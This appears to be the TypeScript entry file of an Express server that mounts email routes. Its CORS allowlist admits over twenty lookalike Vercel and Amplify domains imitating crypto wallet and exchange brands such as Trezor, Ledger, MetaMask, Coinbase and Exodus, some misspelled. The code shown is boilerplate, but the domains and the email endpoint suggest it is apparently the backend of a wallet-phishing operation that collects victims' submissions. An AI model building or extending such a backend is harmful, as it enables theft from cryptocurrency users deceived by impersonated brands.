import express, { Request, Response } from "express";
import dotenv from "dotenv";
import cors from "cors";
import emailRoutes from "./routes/email.routes";

dotenv.config();

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware 
app.use(cors({
    origin: ["http://localhost:3000",
        "https://trezor-sepia-ram-pod-paint-sigma-gole-324324-psi.vercel.app", //aws
        "https://trezor-aws-rame-pod-paint-sigma-rolee-324324-psi.vercel.app", //website
        "https://trezor-website-j3ny-ram-pod-paint-sigma-gole-324324-psi.vercel.app",
        "https://trezor-website-aws-n1no-paint-sigma-gole-324324-psi.vercel.app",
        "https://ledger-aws-4llv-n1no-paint-sigma-gole-324324-psi.vercel.app",
        "https://ledger-ram-n1no-paint-sigma-gole-324324-psi.vercel.app",
        "https://ledger-orpin-tan-omega-firgme-rule-324324-psi.vercel.app",
        "https://ledger-aws-tan-omega-firgme-rule-324324-psi.vercel.app",//aws
        "https://trust-wallet-blond-eight-sigma-dfasf.vercel.app",
        "https://uphold-wallet-blond-nine-go-sigma-dfasf.vercel.app",
        "https://coinbase-gamma-pen-three-wallet-blond-six-sigma-dfasf.vercel.app",
        "https://robbinhood-chi-blond-ten-sigma-dfasf.vercel.app",
        "https://i-trust-capital-blond-ten-sigma-dfasf.vercel.app",
        "https://kreken-seven-capital-blond-ten-sigma-dfasf.vercel.app",
        "https://gemini-pi-mocha-seven-capital-blond-ten-sigma-dfasf.vercel.app",
        "https://meta-mask-orcin-mocha-ten-capital-blond-six-sigma-dfasf.vercel.app",
        "https://ndax-chi-wallet-blond-nine-go-sigma-dfasf.vercel.app",
        "https://net-coins-chi-wallet-blond-nine-go-sigma-dfasf.vercel.app",
        "https://coinsquare-three-wallet-blond-ten-sigma-dfasf.vercel.app",
        "https://exodus-blond-three-wallet-blond-ten-sigma-dfasf.vercel.app",
        "https://phantomus-ten-three-wallet-blond-ten-sigma-dfasf.vercel.app",
        // AWS URL
        // TRezor
        "https://main.d2j5w5fgm3nt0w.amplifyapp.com",
        // trezor
        "https://main.day93aqamqn2.amplifyapp.com",
    ],
    methods: ["GET", "POST", "PUT", "DELETE", "PATCH"],
    credentials: true,
}));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.get("/api/v1", (req: Request, res: Response) => {
    res.send("API v1 is working!");
});

// ✅ Mount email routes
app.use("/api/v1", emailRoutes);

app.listen(PORT, () => {
    console.log(`Server running at http://localhost:${PORT}`);
});
